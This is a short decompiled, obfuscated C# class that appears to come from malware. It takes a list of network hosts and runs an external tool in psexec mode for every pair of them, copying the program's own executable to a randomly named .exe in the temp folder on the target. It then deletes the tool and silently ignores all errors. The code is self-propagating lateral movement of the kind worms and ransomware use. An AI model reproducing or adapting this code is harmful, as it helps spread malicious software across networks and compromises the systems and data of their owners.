using System.Collections.Generic;
using System.IO;
using System.Reflection;
using ns1;

namespace ns4;

internal class Class11
{
	public static List<string> list_0 = new List<string>();

	public static string string_0 = "";

	public static void smethod_0()
	{
		try
		{
			list_0 = Class32.smethod_11();
			string path = "";
			if (list_0.Count > 0)
			{
				path = Class32.smethod_56();
			}
			if (File.Exists(path))
			{
				foreach (string item in list_0)
				{
					string text = (string_0 = item);
					foreach (string item2 in list_0)
					{
						if (!(item2 == string_0))
						{
							Class32.smethod_59(path, "-m=psexec -i=" + string_0 + " -d=" + item2 + " -f=" + Assembly.GetEntryAssembly()!.Location + " -e=" + Path.Combine(Path.GetTempPath(), Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe"));
						}
					}
				}
			}
			File.Delete(path);
		}
		catch
		{
		}
	}
}
